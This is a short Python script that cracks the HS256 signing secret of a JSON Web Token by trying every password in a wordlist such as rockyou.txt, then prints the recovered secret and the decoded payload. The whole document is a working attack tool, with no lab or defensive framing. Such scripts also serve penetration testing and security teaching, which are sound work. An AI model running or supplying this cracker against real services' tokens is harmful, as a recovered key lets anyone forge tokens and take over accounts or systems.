import jwt
from jwt.exceptions import InvalidSignatureError, DecodeError


def brute_force_jwt(token, wordlist_path):
    try:
        with open(wordlist_path, 'r') as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print("Wordlist file not found.")
        return None

    for password in passwords:
        try:
            decoded = jwt.decode(token, password, algorithms=["HS256"])
            print("\nSecret Key Found:", password)
            print("Decoded Payload:", decoded)
            return password
        except InvalidSignatureError:
            pass
        except DecodeError:
            print("Invalid JWT format.")
            return None

    print("\nNo key matched.")
    return None


# === Example Usage ===
if __name__ == "__main__":
    jwt_token = input("Enter the JWT token: ")
    wordlist_file = input("Enter path to your wordlist (e.g., rockyou.txt): ")
    brute_force_jwt(jwt_token, wordlist_file)
